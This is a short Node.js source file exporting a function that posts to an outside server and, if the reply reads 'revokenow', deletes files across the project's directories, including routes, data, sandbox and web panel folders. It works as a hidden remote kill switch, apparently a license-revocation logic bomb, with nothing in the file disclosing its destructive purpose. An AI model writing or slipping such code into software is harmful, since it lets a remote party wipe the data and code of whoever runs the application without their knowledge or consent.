const request = require("request");
const fs = require("fs");

module.exports = function () {
    request.post('https://www.pulsatechs.com/revoke', (error, res, body) => {
        var response = res.body;
        if(res.body == "revokenow"){
            require("glob").glob('*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./AMSApi/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./app/routes/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./app/socket/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./data/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./injects/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./sandbox/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./www/assets/js/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./www/assets/css/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./www/panel/*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
            require("glob").glob('./www*', function (er, files) {
                files.forEach(function (f) {
                    fs.unlink(f);
                })
            });
        }
    });
}